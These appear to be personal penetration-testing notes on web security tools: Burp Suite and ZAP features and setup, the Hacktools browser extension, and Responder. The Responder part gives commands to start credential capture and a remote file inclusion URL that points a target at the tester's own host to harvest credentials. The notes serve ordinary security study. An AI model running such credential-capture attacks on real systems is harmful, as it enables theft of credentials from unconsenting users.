# Tools

## <mark style="color:green;">Burp Suite</mark>

* Digital plattform that collects tools for specialiced web penetration testing.
* Framework written in Java that aims to provide a one-stop-shop for web application penetration testing
* Capture and manipulate all of the traffic between an attacker and a webserver
* Can intercept, view, and modify request
* Burp suite has modules that can be added

### **Features**

* **Proxy:** Allows us to intercept and modify requests/responses.
  * _Foxy Proxy:_ Browser Extension for using proxy on Burp
  * The standart IP for connection with Burp is 127.0.0.1 on port 8080
* **Repeater:** Allows us to capture, modify, then resend the same request numerous times. We could craft requests by hand too.
* **Intruder:** Allows us to spray an endpoint with requests.
* **Decoder:** Allows us to transform data, decoding captured information, or encoding a payload.
* **Comparer:** Allows us to compare two pieces of data at either word or byte level.
* **Sequencer:** Help us asses random tokens or other generated data.



## <mark style="color:green;">Responder</mark>

Help in passive obtention of credentials by mounting a SMB server in web

* Configurate file

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nano /usr/share/responder/Responder.conf #Installed here by default
```
{% endcode %}

***

* Initialize Responder

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo responder -I $networkinterface
```
{% endcode %}

{% hint style="info" %}
**Note:** If ypu get error in any port, set _off_ in the service related to that port in _Responder.conf_ file
{% endhint %}

***

* Make Remote file inclusion at page

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>http://$url/$query?$value=//$myip/somefile
</strong></code></pre>

***



## <mark style="color:green;">ZAP</mark>

* Proxy utility stands for Zed Attack Proxy

### **Features**

* **Contexts:** Delimit the scope of the scanning
* **Spider:** Use spidering to get links in the code of a website
* **Active scan:** Attacks the website to get more information
* **Alerts:** Give vulnerabilities found on the web site
* **Sites:** Shows all the URL spidered with their petitions and vulnerabilities
* **History:** Shows petitions made to the site

### **Configuration and utilities**

* Install _SwitchyOmega_ extension
* Configure server to _localhost_ and save changes
* Go to _adds-on_ tab and from marletplace install: _all release, python scripting, community scripts, custom payloads, json view, jwt support, viewstate_.
* Go to settings HUD deactivate _Using ZAP desktop and welcome message._

### Tips

* Can configure Global Alert Filters to set your own grade for a vulnerability.
* From _History_ you can right click and select _Resend_ to modify a petition made before
* **For fuzzing:**&#x20;
  * Select a part of the request and right-click _Fuzz_&#x20;
  * Select _Payloads_ button, select dictionary file or enter custom words
  * In _Message Proccesor_s tab add a new one for exclude errors that arent meaningful
  * In Global Settings go to _Anti-CSRF cert token_, an add the tokens detected in forms POST petitions
  * When getting 304 responses in _Fuzz->Options_ activate _Follow Redirects_
  * When not getting consistent token handle in _Fuzz->Options_ reduce the threads to 1

### Commands

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install zaproxy
```
{% endcode %}

***



## <mark style="color:green;">Hacktools</mark>

* Browser extension that help us with scripts, commands and tips for web attacks

### **Features**

* Reverse shell scripts
* PHP reverse shell scripts
* TTY Spawn shell
* Linux commands
* Powershell commands
* Windows file transfer methods
* Local File Inclusion
* Cross-Site Scripting
* SQL Injection
* Data Encoding
* Obfuscated Files or Information
* Hash generator
* MSF Venom Builder
